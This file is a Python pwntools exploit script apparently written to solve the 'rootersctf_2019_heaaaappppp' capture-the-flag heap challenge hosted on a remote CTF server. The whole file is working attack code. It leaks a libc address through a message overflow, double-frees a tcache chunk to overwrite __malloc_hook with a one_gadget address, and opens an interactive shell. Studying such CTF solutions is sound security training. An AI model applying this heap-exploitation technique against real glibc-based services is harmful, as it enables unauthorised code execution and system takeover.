import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='rootersctf_2019_heaaaappppp'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
# pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',27391)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			# io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			libc=ELF('../../x64libc/libc.so.6')
			one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('Enter your choice: ','0')
			io.sendlineafter('Enter age of user: ',str(a))
			io.sendafter('Enter username: ',c)

		def delete():
			io.sendlineafter('Enter your choice: ','2')
			

		def edit(a,c):
			io.sendlineafter('Enter your choice: ','1')
			io.sendlineafter('Enter age of user: ',str(a))
			io.sendafter('Enter username: ',c)

		def add_massage(a):
			io.sendlineafter('Enter your choice: ','3')
			io.sendafter('Enter message to be sent:',a)


		pay='a'*0x20+'\x21'
		add_massage(pay)
		io.recvuntil('a'*0x20)
		libc_base=u64(io.recv(6)+'\x00\x00')-0x3ec721
		pay='a'*0x18+'\x21'
		add_massage(pay)
		io.recvuntil('a'*0x18)
		libc_base=u64(io.recv(6)+'\x00\x00')-0x3ec721
		libc.address=libc_base
		system_addr=libc.sym['execve']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		add(1,'1')
		delete()
		delete()
		add(1,'1')
		edit(1,p64(libc.sym['__malloc_hook'])+'/bin/sh\x00')
		edit(1,p64(libc_base+one_gadgaet[1]))
		# add_massage('/bin/sh\x00')




		# success('elf_base:'+hex(elf_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue